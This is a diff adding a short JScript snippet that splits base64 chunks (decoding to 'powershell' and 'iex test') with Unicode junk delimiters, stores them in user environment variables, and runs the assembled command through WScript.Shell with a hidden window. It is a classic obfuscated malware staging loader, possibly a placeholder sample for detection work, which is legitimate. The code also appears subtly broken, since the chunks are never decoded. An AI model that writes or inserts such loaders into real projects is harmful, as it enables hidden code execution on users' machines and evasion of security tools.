@@ -1,0 +1,10 @@
+var shell = new ActiveXObject("WScript.Shell");
+var userEnv = shell.Environment("User");
+var blobA = "cG93ZXJzaGVsbA==\u0CA8\u2A29\u29D6\u2B47AAAA";
+var blobB = "aWV4IHRlc3Q=\u0CA8\u2A29\u29D6\u2B47BBBB";
+blobA = blobA.split("\u0CA8\u2A29\u29D6\u2B47AAAA").join("");
+blobB = blobB.split("\u0CA8\u2A29\u29D6\u2B47BBBB").join("");
+userEnv.Item("STAGECHUNK01") = blobA;
+userEnv.Item("STAGECHUNK02") = blobB;
+var staged = "$env:STAGECHUNK01+$env:STAGECHUNK02";
+shell.Run(staged, 0, true);
